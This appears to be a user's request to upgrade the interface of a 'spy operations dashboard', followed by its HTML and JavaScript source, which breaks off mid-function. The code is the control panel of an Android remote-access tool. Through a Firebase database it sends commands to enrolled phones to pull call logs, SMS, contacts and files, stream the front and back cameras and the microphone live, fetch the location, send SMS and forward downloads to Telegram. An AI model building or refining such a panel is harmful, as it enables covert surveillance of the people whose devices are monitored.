make this my panleindex1.html advance fully INVEST LIKE 5CR MAKE FULLY HIGHLY ADVANCE UI LIKE SCINCE FINCION UI TYPE ADVANCE <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üïµÔ∏è‚Äç‚ôÇÔ∏è AGENT-X - Spy Operations Dashboard</title>
  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Google Fonts: Inter -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            'inter': ['Inter', 'sans-serif'],
            'orbitron': ['Orbitron', 'sans-serif'],
          },
          colors: {
            agent: {
              50: '#e0f2fe',
              100: '#bae6fd',
              200: '#7dd3fc',
              300: '#38bdf8',
              400: '#0ea5e9',
              500: '#0284c7',
              600: '#0369a1',
              700: '#075985',
              800: '#0c4a6e',
              900: '#082f49',
            },
            neon: {
              500: '#00ffe7',
              600: '#00e6c3',
              700: '#00bfae',
            },
            danger: {
              500: '#ef4444',
            },
            success: {
              500: '#22c55e',
            }
          }
        }
      }
    }
  </script>
  <style>
    body {
      font-family: 'Inter', 'Orbitron', sans-serif;
      background: linear-gradient(120deg, #0f2027 0%, #2c5364 100%);
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
    }
    .animated-bg {
      position: fixed;
      top: 0; left: 0; width: 100vw; height: 100vh;
      z-index: 0;
      pointer-events: none;
      background: repeating-linear-gradient(135deg, rgba(0,255,231,0.04) 0 2px, transparent 2px 40px), repeating-linear-gradient(-45deg, rgba(0,255,231,0.03) 0 1px, transparent 1px 30px);
      animation: movebg 16s linear infinite;
    }
    @keyframes movebg {
      0% { background-position: 0 0, 0 0; }
      100% { background-position: 200px 400px, 400px 200px; }
    }
    .glass-effect {
      background: rgba(20, 30, 48, 0.85);
      backdrop-filter: blur(24px) saturate(1.3);
      border: 1.5px solid rgba(0,255,231,0.13);
      box-shadow: 0 8px 32px 0 rgba(0,255,231,0.08), 0 1.5px 8px 0 #00ffe7cc;
    }
    .neon-border {
      border: 2.5px solid #00ffe7;
      box-shadow: 0 0 24px #00ffe7, 0 0 64px #00ffe733;
      animation: neonPulse 2.5s infinite alternate;
    }
    @keyframes neonPulse {
      0% { box-shadow: 0 0 24px #00ffe7, 0 0 64px #00ffe733; }
      100% { box-shadow: 0 0 48px #00ffe7, 0 0 128px #00ffe766; }
    }
    .ticker {
      overflow: hidden;
      white-space: nowrap;
      position: relative;
      width: 320px;
      height: 28px;
      background: rgba(0,255,231,0.08);
      border-radius: 8px;
      border: 1px solid #00ffe7;
      box-shadow: 0 0 8px #00ffe7cc;
    }
    .ticker-text {
      display: inline-block;
      padding-left: 100%;
      animation: tickerMove 18s linear infinite;
      color: #00ffe7;
      font-family: 'Orbitron', monospace;
      font-weight: 700;
      font-size: 1rem;
      letter-spacing: 0.08em;
    }
    @keyframes tickerMove {
      0% { transform: translateX(0); }
      100% { transform: translateX(-100%); }
    }
    .agent-avatar {
      width: 48px; height: 48px;
      border-radius: 50%;
      border: 3px solid #00ffe7;
      box-shadow: 0 0 16px #00ffe7, 0 0 32px #00ffe733;
      position: relative;
      overflow: hidden;
      background: linear-gradient(135deg, #232526 0%, #0f2027 100%);
      margin-right: 16px;
      transition: box-shadow 0.3s;
    }
    .agent-avatar.online {
      box-shadow: 0 0 32px #00ffe7, 0 0 64px #22c55e99;
      border-color: #22c55e;
      animation: avatarPulse 2s infinite alternate;
    }
    @keyframes avatarPulse {
      0% { box-shadow: 0 0 32px #00ffe7, 0 0 64px #22c55e99; }
      100% { box-shadow: 0 0 48px #00ffe7, 0 0 96px #22c55e44; }
    }
    .card-hover {
      transition: all 0.3s cubic-bezier(.4,2,.6,1);
      will-change: transform, box-shadow;
    }
    .card-hover:hover {
      transform: translateY(-8px) scale(1.025) rotateZ(-0.5deg);
      box-shadow: 0 24px 48px #00ffe733, 0 2px 16px #00ffe7cc;
      border-color: #00ffe7;
    }
    .premium-glow {
      box-shadow: 0 0 32px #00ffe7, 0 0 64px #0ea5e9, 0 0 128px #a21caf44;
      border: 2.5px solid #0ea5e9;
      animation: neonPulse 2.5s infinite alternate;
    }
    .sparkline {
      filter: drop-shadow(0 0 8px #00ffe7);
    }
    .floating-btn {
      position: fixed;
      bottom: 32px; right: 32px;
      z-index: 50;
      background: linear-gradient(90deg, #00ffe7 0%, #0ea5e9 100%);
      color: #18181b;
      border-radius: 50%;
      width: 64px; height: 64px;
      display: flex; align-items: center; justify-content: center;
      font-size: 2rem;
      box-shadow: 0 0 32px #00ffe7cc;
      transition: box-shadow 0.2s, transform 0.2s;
      cursor: pointer;
    }
    .floating-btn:hover {
      box-shadow: 0 0 64px #0ea5e9cc, 0 0 128px #00ffe7cc;
      transform: scale(1.08) rotateZ(-2deg);
    }
    .sidebar-scroll::-webkit-scrollbar {
      width: 6px;
    }
    .sidebar-scroll::-webkit-scrollbar-thumb {
      background: #00ffe7;
      border-radius: 3px;
    }
    .sidebar-scroll::-webkit-scrollbar-track {
      background: rgba(0,0,0,0.1);
    }
    .status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    .status-online { background-color: #22c55e; }
    .status-offline { background-color: #ef4444; }
    .animate-pulse-slow {
      animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .fade-in-up { animation: fadeInUp 0.6s ease-out; }
  </style>
</head>
<body class="bg-gradient-to-br from-gray-900 via-slate-900 to-black min-h-screen font-inter text-neon-500 relative">
  <div class="animated-bg"></div>
  <!-- Header -->
  <header class="glass-effect border-b border-neon-500/20 sticky top-0 z-50">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex items-center justify-between h-20">
      <div class="flex items-center space-x-6">
        <div class="w-16 h-16 bg-gradient-to-r from-agent-500 to-neon-500 rounded-2xl flex items-center justify-center shadow-lg neon-border premium-glow animate-pulse">
          <i class="fas fa-user-secret text-neon-500 text-3xl animate-spin-slow"></i>
        </div>
        <div>
          <h1 class="text-3xl font-extrabold bg-gradient-to-r from-neon-500 to-agent-400 bg-clip-text text-transparent tracking-widest uppercase font-orbitron">
            AGENT-X
          </h1>
          <div class="ticker mt-1">
            <span class="ticker-text">MISSION: GLOBAL SURVEILLANCE &bull; STATUS: LIVE &bull; ALL AGENTS ONLINE &bull; NETWORK SECURE &bull; INTEL FLOW: OPTIMAL</span>
          </div>
        </div>
      </div>
      <div class="flex items-center space-x-8">
        <div class="hidden md:flex items-center space-x-4 text-sm">
          <div class="flex items-center">
            <span class="status-dot status-online animate-pulse-slow"></span>
            <span class="text-success-500 font-medium">Mission Active</span>
          </div>
          <div class="text-neon-500">
            <i class="fas fa-clock mr-2"></i>
            <span id="currentTime">Loading...</span>
          </div>
        </div>
        <button id="sidebarToggle" class="md:hidden p-2 rounded-lg bg-neon-500/10 hover:bg-neon-500/20 transition-colors focus:outline-none focus:ring-2 focus:ring-agent-500">
          <i class="fas fa-bars text-neon-500 text-xl"></i>
        </button>
        <div class="flex items-center space-x-3">
          <button class="p-2 rounded-lg bg-neon-500/10 hover:bg-neon-500/20 transition-colors">
            <i class="fas fa-bug text-neon-500 animate-pulse"></i>
          </button>
          <button class="p-2 rounded-lg bg-neon-500/10 hover:bg-neon-500/20 transition-colors">
            <i class="fas fa-cog text-neon-500 animate-spin-slow"></i>
          </button>
        </div>
      </div>
    </div>
  </header>
  <div class="flex h-screen">
    <!-- Sidebar (Agent Tools) -->
    <aside id="sidebar" class="w-80 bg-black/30 backdrop-blur-xl border-r border-neon-500/10 flex flex-col fixed md:static inset-y-0 left-0 z-40 transform -translate-x-full md:translate-x-0 transition-transform duration-300 ease-in-out md:w-80 md:relative md:flex md:h-auto h-full shadow-2xl premium-glow" style="max-width:100vw;">
      <div class="p-6">
        <h2 class="text-lg font-semibold text-neon-500 mb-4 flex items-center">
          <i class="fas fa-satellite-dish mr-3 text-agent-400 animate-pulse"></i>
          Active Agents
        </h2>
        <div id="deviceList" class="space-y-3 sidebar-scroll overflow-y-auto max-h-[calc(100vh-200px)]">
          <!-- Devices/Agents will be populated here -->
        </div>
      </div>
    </aside>
    <!-- Overlay for mobile sidebar -->
    <div id="sidebarOverlay" class="fixed inset-0 bg-black/60 z-30 hidden md:hidden" style="backdrop-filter: blur(2px);"></div>
    <!-- Main Content -->
    <main class="flex-1 overflow-auto ml-0 md:ml-0">
      <div class="p-2 sm:p-4 md:p-6 space-y-6">
        <!-- Stats Cards -->
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 md:gap-6">
          <div class="glass-effect neon-border rounded-2xl p-6 card-hover">
            <div class="flex items-center justify-between">
              <div>
                <p class="text-agent-200 text-sm font-medium">Active Agents</p>
                <p class="text-2xl font-bold text-neon-500" id="activeDevices">0</p>
              </div>
              <div class="w-12 h-12 bg-agent-500/20 rounded-xl flex items-center justify-center">
                <i class="fas fa-user-ninja text-neon-500 text-xl"></i>
              </div>
            </div>
          </div>
          <div class="glass-effect neon-border rounded-2xl p-6 card-hover">
            <div class="flex items-center justify-between">
              <div>
                <p class="text-agent-200 text-sm font-medium">Intel Operations</p>
                <p class="text-2xl font-bold text-neon-500" id="totalOperations">0</p>
              </div>
              <div class="w-12 h-12 bg-success-500/20 rounded-xl flex items-center justify-center">
                <i class="fas fa-bug text-success-500 text-xl"></i>
              </div>
            </div>
          </div>
          <div class="glass-effect neon-border rounded-2xl p-6 card-hover">
            <div class="flex items-center justify-between">
              <div>
                <p class="text-agent-200 text-sm font-medium">Session Uptime</p>
                <p class="text-2xl font-bold text-neon-500" id="sessionUptime">0h 0m</p>
              </div>
              <div class="w-12 h-12 bg-agent-500/20 rounded-xl flex items-center justify-center">
                <i class="fas fa-clock text-agent-400 text-xl"></i>
              </div>
            </div>
          </div>
          <div class="glass-effect neon-border rounded-2xl p-6 card-hover relative overflow-hidden group col-span-1" id="networkLoadCard">
            <div class="absolute inset-0 bg-gradient-to-br from-agent-700/40 via-agent-500/20 to-neon-500/30 blur-2xl opacity-60 pointer-events-none transition-all duration-700 group-hover:scale-105"></div>
            <div class="flex flex-col sm:flex-row items-center justify-between">
              <div class="flex-1 w-full">
                <p class="text-agent-200 text-sm font-medium">Network Load</p>
                <div class="relative flex items-center justify-center my-2 w-full">
                  <svg id="networkLoadCircle" width="64" height="64" viewBox="0 0 64 64" class="mr-2 min-w-[64px]">
                    <circle cx="32" cy="32" r="28" fill="none" stroke="#0ea5e9" stroke-width="8" opacity="0.15"/>
                    <circle id="networkLoadProgress" cx="32" cy="32" r="28" fill="none" stroke="#00ffe7" stroke-width="8"
                      stroke-linecap="round" stroke-dasharray="176" stroke-dashoffset="176"
                      style="transition: stroke-dashoffset 0.5s cubic-bezier(.4,2,.6,1);"/>
                  </svg>
                  <span id="networkLoadPercent" class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 text-3xl font-extrabold text-neon-500 drop-shadow-lg">0%</span>
                </div>
                <svg id="networkLoadSparkline" width="80" height="24" class="mt-2 w-full max-w-[120px] sparkline">
                  <polyline fill="none" stroke="#00ffe7" stroke-width="2" points=""/>
                </svg>
              </div>
              <div class="w-12 h-12 flex items-center justify-center relative mt-4 sm:mt-0">
                <div class="absolute inset-0 rounded-full bg-neon-500/30 blur-md animate-pulse"></div>
                <i class="fas fa-satellite text-neon-500 text-3xl relative z-10 animate-pulse"></i>
              </div>
            </div>
          </div>
        </div>
        <!-- Main Content Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 md:gap-6">
          <!-- Agent Status -->
          <div class="glass-effect neon-border rounded-2xl p-6 card-hover">
            <div class="flex items-center justify-between mb-6">
              <h2 class="text-xl font-bold text-neon-500 flex items-center">
                <i class="fas fa-user-secret mr-3 text-agent-400"></i>
                Agent Status
              </h2>
              <button class="p-2 rounded-lg bg-neon-500/10 hover:bg-neon-500/20 transition-colors">
                <i class="fas fa-expand text-neon-500"></i>
              </button>
            </div>
            <div id="deviceInfo" class="space-y-4">
              <p class="text-agent-200">Select an agent to view intel...</p>
            </div>
          </div>
          <!-- Mission Feed -->
          <div class="glass-effect neon-border rounded-2xl p-6 card-hover">
            <div class="flex items-center justify-between mb-6">
              <h2 class="text-xl font-bold text-neon-500 flex items-center">
                <i class="fas fa-terminal mr-3 text-agent-400"></i>
                Mission Feed
              </h2>
              <button class="px-3 py-1 text-xs bg-agent-500 hover:bg-agent-600 rounded-lg transition-colors">
                Clear
              </button>
            </div>
            <div class="overflow-hidden rounded-xl bg-black/20">
              <div class="max-h-80 overflow-y-auto">
                <table class="w-full">
                  <thead class="bg-neon-500/10">
                    <tr>
                      <th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase tracking-wider">Time</th>
                      <th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase tracking-wider">Action</th>
                      <th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase tracking-wider">Status</th>
                    </tr>
                  </thead>
                  <tbody id="logTableBody" class="divide-y divide-neon-500/10">
                    <!-- Log entries will be populated here -->
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  </div>
  <!-- Modal Overlay -->
  <div id="fullscreenModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden items-center justify-center p-2 sm:p-4">
    <div class="glass-effect neon-border rounded-2xl w-full max-w-4xl max-h-[90vh] overflow-hidden flex flex-col" style="min-height:60vh;">
      <div class="flex items-center justify-between p-4 sm:p-6 border-b border-neon-500/10">
        <h3 id="modalSectionTitle" class="text-lg sm:text-xl font-bold text-neon-500"></h3>
        <button id="modalCloseBtn" onclick="closeFullscreenModal()" class="p-2 rounded-lg bg-neon-500/10 hover:bg-neon-500/20 transition-colors">
          <i class="fas fa-times text-neon-500"></i>
        </button>
      </div>
      <div id="modalSectionContent" class="p-4 sm:p-6 overflow-y-auto max-h-[calc(90vh-120px)]">
        <!-- Modal content will be populated here -->
      </div>
    </div>
  </div>
  <!-- Toast Container -->
  <div id="toastContainer" class="fixed bottom-4 right-2 sm:bottom-6 sm:right-6 z-50 space-y-3"></div>
  <!-- Firebase Scripts and JS remain unchanged, but all UI/UX and text are now agent/spy themed -->
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      databaseURL: "https://clint-avs-default-rtdb.firebaseio.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let allDevices = {};
    let selectedUid = null;
    let lastCommand = null;
    let lastFileList = [];
    let logEntries = [];
    let startTime = new Date();
    let liveStreamResponseRef = null;

    let audioContext = null;
    let audioQueue = [];
    let isPlayingAudio = false;
    let audioBuffer = [];
    let lastAudioTime = 0;
    let liveAudioChunks = [];
    let isLiveAudioPlaying = false;
    let isMicrophoneStopped = false;
    let lastDeviceSnapshot = null;
    let lastDeviceListHTML = '';
    let lastLogTableHTML = '';
    let statsUpdateInterval = null;
    let deviceListNeedsUpdate = true;
    let logTableNeedsUpdate = true;
    
    // Toast notification system
    const icons = {
      success: '‚úÖ',
      error: '‚ùå',
      info: '‚ÑπÔ∏è',
      warning: '‚ö†Ô∏è'
    };

    // Enhanced real-time updates with instant refresh
    function updateRealtimeStats() {
      const now = new Date();
      
      // Update time instantly
      const currentTimeElement = document.getElementById('currentTime');
      if (currentTimeElement) {
        currentTimeElement.textContent = now.toLocaleTimeString('en-IN', { 
          hour: '2-digit', 
          minute: '2-digit', 
          second: '2-digit',
          timeZone: 'Asia/Kolkata' 
        }) + ' IST, Jul 13, 2025';
      }

      // Calculate real-time stats
      const activeDevices = Object.keys(allDevices).length;
      const totalOperations = logEntries.length;
      const sessionUptimeMs = now - startTime;
      const hours = Math.floor(sessionUptimeMs / (1000 * 60 * 60));
      const minutes = Math.floor((sessionUptimeMs % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((sessionUptimeMs % (1000 * 60)) / 1000);
      
      // Calculate dynamic network load based on activity
      const networkLoad = Math.min(100, Math.max(10, activeDevices * 15 + totalOperations * 2));

      // Update UI elements instantly
      const activeDevicesElement = document.getElementById('activeDevices');
      const totalOperationsElement = document.getElementById('totalOperations');
      const sessionUptimeElement = document.getElementById('sessionUptime');
      const networkLoadElement = document.getElementById('networkLoad');

      if (activeDevicesElement) activeDevicesElement.textContent = activeDevices;
      if (totalOperationsElement) totalOperationsElement.textContent = totalOperations;
      if (sessionUptimeElement) sessionUptimeElement.textContent = `${hours}h ${minutes}m ${seconds}s`;
      if (networkLoadElement) networkLoadElement.textContent = `${networkLoad}%`;

      // Animate network load
      animateNetworkLoad(networkLoad);

      // Update sparkline history
      networkLoadHistory.push(networkLoad);
      if (networkLoadHistory.length > 15) networkLoadHistory.shift();
      updateNetworkLoadSparkline();

      // Only update device list/log table if flagged
      if (deviceListNeedsUpdate) {
        renderDeviceList();
        deviceListNeedsUpdate = false;
      }
      if (logTableNeedsUpdate) {
        renderLogTable();
        logTableNeedsUpdate = false;
      }
    }

    // --- Throttle stats updates to every 500ms ---
    function startStatsInterval() {
      if (statsUpdateInterval) clearInterval(statsUpdateInterval);
      statsUpdateInterval = setInterval(updateRealtimeStats, 500);
    }

    // Enhanced Firebase listeners with instant real-time updates
    db.ref("Devices").on("value", snapshot => {
      const newDevices = snapshot.val() || {};
      const deviceCountChanged = Object.keys(allDevices).length !== Object.keys(newDevices).length;
      const selectedDeviceChanged = selectedUid && !newDevices[selectedUid];
      
      // Only update if devices actually changed
      if (JSON.stringify(allDevices) !== JSON.stringify(newDevices)) {
        allDevices = newDevices;
        deviceListNeedsUpdate = true;
      }
      
      // Handle device selection changes
      if (!selectedUid && Object.keys(allDevices).length > 0) {
        selectedUid = Object.keys(allDevices)[0];
        renderDevice(selectedUid);
        setupResponseListener(selectedUid);
      } else if (selectedDeviceChanged) {
        selectedUid = Object.keys(allDevices)[0] || null;
        lastCommand = null;
        renderDevice(selectedUid);
        if (selectedUid) setupResponseListener(selectedUid);
      } else if (selectedUid && allDevices[selectedUid]) {
        renderDevice(selectedUid);
      }
      
      // Show real-time notifications for device changes
      if (deviceCountChanged) {
        const currentCount = Object.keys(allDevices).length;
        showToast(`üïµÔ∏è‚Äç‚ôÇÔ∏è ${currentCount} agent${currentCount !== 1 ? 's' : ''} online`, "info");
      }
    });

    function setupResponseListener(uid) {
      if (uid) {
        // Remove previous listener to prevent duplicates
        db.ref(`Devices/${uid}/response`).off();
        
        // Enhanced real-time response listener with instant updates
        db.ref(`Devices/${uid}/response`).on("value", snapshot => {
          const response = snapshot.val();
          const timestamp = new Date().toLocaleTimeString();

          if (selectedUid === uid && lastCommand) {
            // Instant log update
            const logEntry = { 
              time: timestamp, 
              command: lastCommand, 
              status: response ? 'Success' : 'Pending' 
            };
            
            // Add to logs and update UI immediately
            logEntries.unshift(logEntry);
            if (logEntries.length > 10) logEntries.pop(); // Keep only 10 logs
            logTableNeedsUpdate = true;

            // Handle different response types instantly
            if (response) {
              if (lastCommand === 'get_app_usage_sorted') {
                // Get usage data immediately
                db.ref(`Devices/${uid}/usage_info_all`).once("value", usageSnap => {
                  const usageData = usageSnap.val();
                  renderContentInModal(usageData, lastCommand);
                });
              } else if (lastCommand === 'get_app_list') {
                renderContentInModal(response, lastCommand);
              } else if (lastCommand.startsWith('download_to_telegram:')) {
                showToast(`‚úÖ ${response}`, "success");
              }         else if (lastCommand.startsWith('start_camera_stream:')) {
          // Handle camera stream instantly
          if (response.startsWith("üñºÔ∏è Live Camera:")) {
            renderContentInModal(response, lastCommand);
          }
        } else if (lastCommand === 'start_microphone_stream' || lastCommand === 'stop_microphone_stream') {
          // Handle microphone stream responses
          if (response.startsWith("üéôÔ∏è Live Audio:") || response.startsWith("üéôÔ∏è WAV Audio:")) {
            renderContentInModal(response, lastCommand);
          }
        } else {
          renderContentInModal(response, lastCommand);
        }
              
              // Show success notification
              showToast(`‚úÖ ${lastCommand} completed`, "success");
            }
          }
        });
        
        // Also listen for heartbeat updates for real-time status
        db.ref(`Devices/${uid}/heartbeat`).on("value", snapshot => {
          if (selectedUid === uid) {
            renderDevice(uid); // Update device info instantly
          }
        });
      }
    }

    function renderDeviceList() {
      const container = document.getElementById("deviceList");
      const now = Date.now();
      let html = "";
      Object.entries(allDevices).forEach(([uid, device]) => {
        const info = device.info || {};
        const battery = typeof device.battery === 'string' ? device.battery : (info.Battery || "-");
        const status = device.status || "Unknown";
        const name = info["Device Name"] || uid;
        const lastHeartbeat = device.heartbeat || 0;
        const isOnline = now - lastHeartbeat < 10000;
        const onlineStatus = isOnline ? "Online" : "Offline";
        if (!isOnline) return;
        html += `
          <div class="glass-effect rounded-xl p-4 cursor-pointer transition-all duration-300 hover:bg-neon-500/10 ${selectedUid === uid ? 'ring-2 ring-agent-500 bg-agent-500/20' : ''}" onclick="(function(){selectedUid='${uid}';lastCommand=null;closeFullscreenModal();renderDevice('${uid}');setupResponseListener('${uid}');deviceListNeedsUpdate=true;})()">
            <div class="flex items-center space-x-3">
              <div class="w-10 h-10 bg-gradient-to-r from-agent-500 to-neon-500 rounded-lg flex items-center justify-center">
                <i class="fas fa-user-ninja text-white"></i>
              </div>
              <div class="flex-1">
                <h3 class="font-semibold text-white">${name}</h3>
                <div class="flex items-center text-sm">
                  <span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span>
                  <span class="text-agent-200">${onlineStatus}</span>
                  <span class="text-neon-500 ml-2">‚Ä¢ ${battery}</span>
                </div>
              </div>
            </div>
          </div>
        `;
      });
      if (html !== lastDeviceListHTML) {
        container.innerHTML = html;
        lastDeviceListHTML = html;
      }
    }

    function renderDevice(uid) {
      const device = allDevices[uid];
      if (!device) {
        document.getElementById("deviceInfo").innerHTML = `
          <div class="text-center py-8">
            <i class="fas fa-user-ninja text-4xl text-agent-200 mb-4"></i>
            <p class="text-agent-200">No agent selected or agent offline.</p>
          </div>
        `;
        return;
      }
      
      const info = device.info || {};
      const status = device.status || "Unknown";

      document.getElementById("deviceInfo").innerHTML = `
        <div class="space-y-4">
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="space-y-3">
              <div class="flex items-center space-x-3">
                <i class="fas fa-microchip text-agent-400 w-5"></i>
                <span class="text-agent-200">Agent Name:</span>
                <span class="text-white font-medium">${info["Device Name"] || "-"}</span>
              </div>
              <div class="flex items-center space-x-3">
                <i class="fas fa-industry text-agent-400 w-5"></i>
                <span class="text-agent-200">Brand:</span>
                <span class="text-white font-medium">${info.Brand || "-"}</span>
              </div>
              <div class="flex items-center space-x-3">
                <i class="fas fa-mobile-alt text-agent-400 w-5"></i>
                <span class="text-agent-200">Model:</span>
                <span class="text-white font-medium">${info.Model || "-"}</span>
              </div>
              <div class="flex items-center space-x-3">
                <i class="fas fa-android text-agent-400 w-5"></i>
                <span class="text-agent-200">OS Version:</span>
                <span class="text-white font-medium">${info["OS Version"] || "-"}</span>
              </div>
            </div>
            <div class="space-y-3">
              <div class="flex items-center space-x-3">
                <i class="fas fa-code-branch text-agent-400 w-5"></i>
                <span class="text-agent-200">SDK:</span>
                <span class="text-white font-medium">${info.SDK || "-"}</span>
              </div>
              <div class="flex items-center space-x-3">
                <i class="fas fa-battery-half text-agent-400 w-5"></i>
                <span class="text-agent-200">Battery:</span>
                <span class="text-white font-medium">${typeof device.battery === "string" ? device.battery : (info.Battery || "-")}</span>
              </div>
              <div class="flex items-center space-x-3">
                <i class="fas fa-signal text-agent-400 w-5"></i>
                <span class="text-agent-200">Status:</span>
                <span class="px-2 py-1 rounded-full text-xs font-medium ${status === 'Online' ? 'bg-success-500/20 text-success-500' : 'bg-danger-500/20 text-danger-500'}">${status}</span>
              </div>
            </div>
          </div>
          
          <div class="border-t border-neon-500/10 pt-4">
            <h3 class="text-lg font-semibold text-white mb-4">Quick Actions</h3>
            <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
              <button onclick="sendCommand('${uid}', 'get_file_list')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-folder text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">File List</span>
              </button>
              <button onclick="sendCommand('${uid}', 'get_call_logs')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-phone-alt text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Call Logs</span>
              </button>
              <button onclick="sendCommand('${uid}', 'get_sms_logs')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-sms text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">SMS Logs</span>
              </button>
              <button onclick="sendCommand('${uid}', 'get_contacts')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-address-book text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Contacts</span>
              </button>
              <button onclick="sendCommand('${uid}', 'get_app_list')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-th-list text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">App List</span>
              </button>
              <button onclick="sendCommand('${uid}', 'get_app_usage_sorted')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-clock text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">App Usage</span>
              </button>
              <button onclick="sendCommand('${uid}', 'vibrate')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-vibrate text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Vibrate</span>
              </button>
              <button onclick="promptSMS('${uid}')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-paper-plane text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Send SMS</span>
              </button>
              <button onclick="promptSoundURL('${uid}')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-music text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Play Sound</span>
              </button>
              <button onclick="promptPopup('${uid}')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-bullhorn text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Show Popup</span>
              </button>
              <button onclick="sendCommand('${uid}', 'start_camera_stream:back')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-camera text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Back Camera</span>
              </button>
              <button onclick="sendCommand('${uid}', 'start_camera_stream:front')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-camera text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Front Camera</span>
              </button>
              <button id="micStartBtn_${uid}" onclick="sendCommand('${uid}', 'start_microphone_stream')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-microphone text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Start Microphone</span>
              </button>
              <button id="micStopBtn_${uid}" onclick="sendCommand('${uid}', 'stop_microphone_stream')" class="flex flex-col items-center p-3 bg-danger-500/10 hover:bg-danger-500/20 rounded-xl transition-colors hidden">
                <i class="fas fa-microphone-slash text-danger-500 text-xl mb-2"></i>
                <span class="text-xs text-danger-500">Stop Microphone</span>
              </button>
              <button onclick="sendCommand('${uid}', 'get_location_url')" class="flex flex-col items-center p-3 bg-neon-500/10 hover:bg-neon-500/20 rounded-xl transition-colors">
                <i class="fas fa-map-marker-alt text-agent-400 text-xl mb-2"></i>
                <span class="text-xs text-agent-200">Get Location</span>
              </button>
              <button onclick="testAudio()" class="flex flex-col items-center p-3 bg-success-500/10 hover:bg-success-500/20 rounded-xl transition-colors">
                <i class="fas fa-volume-up text-success-500 text-xl mb-2"></i>
                <span class="text-xs text-success-500">Test Audio</span>
              </button>
            </div>
          </div>
        </div>
      `;
    }

    function sendCommand(uid, command) {
      lastCommand = command;
      let title = 'Response';
      if (command === 'get_file_list' || command.startsWith('open_file:')) title = 'File Manager';
      else if (command === 'get_call_logs') title = 'Call Logs';
      else if (command === 'get_sms_logs') title = 'SMS Logs';
      else if (command === 'get_contacts') title = 'Contacts';
      else if (command === 'get_app_list') title = 'App List';
      else if (command === 'vibrate') title = 'Vibrate';
      else if (command === 'get_app_usage_sorted') title = 'App Usage';
      else if (command.startsWith('send_sms')) title = 'Send SMS';
      else if (command.startsWith('play_url_sound')) title = 'Play Sound';
      else if (command.startsWith('show_popup')) title = 'Show Popup';
